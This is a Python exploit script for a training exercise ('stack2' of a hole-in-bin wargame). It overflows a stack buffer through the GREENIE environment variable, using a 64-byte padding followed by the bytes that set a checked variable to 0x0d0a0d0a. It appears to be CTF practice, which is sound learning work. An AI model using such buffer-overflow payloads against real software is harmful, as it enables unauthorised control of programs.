#!/usr/bin/env python3
"""
ex02 exploit  (stack2: overwrite a variable, source is an ENV VAR).

main():
    p = getenv("GREENIE")                   <- NULL -> errx("please set the GREENIE ...")
    strcpy(buffer=[esp+0x18], p)            <- no bounds check
    cmp  [esp+0x58], 0x0d0a0d0a             <- must equal 0x0d0a0d0a
Offset buffer -> variable = 0x58 - 0x18 = 0x40 = 64 bytes.
0x0d0a0d0a little-endian in memory = bytes 0a 0d 0a 0d = "\n\r\n\r".

Because the target bytes contain newlines/CR, we avoid shell-quoting entirely:
this script can EXECVE the target with GREENIE set correctly.

Two ways to use it:
  1) Print the payload (then set it yourself):
       GREENIE="$(python3 ex02.py)" /opt/hole-in-bin/ex02/bin
  2) Let the script set the env and run the target (robust, recommended):
       python3 ex02.py /opt/hole-in-bin/ex02/bin
       # local: python3 scripts/ex02.py scripts/runlocal.sh challenges/ex02/bin
"""
import os
import sys

OFFSET = 64
# target value 0x0d0a0d0a -> little-endian bytes
payload = b"A" * OFFSET + bytes([0x0a, 0x0d, 0x0a, 0x0d])

if len(sys.argv) > 1:
    # exec mode: run argv[1..] with GREENIE set to the raw payload bytes.
    # Build an all-bytes environment so execve gets consistent types.
    env = {os.fsencode(k): os.fsencode(v) for k, v in os.environ.items()}
    env[b"GREENIE"] = payload
    os.execvpe(sys.argv[1], sys.argv[1:], env)
else:
    # print mode
    sys.stdout.buffer.write(payload)
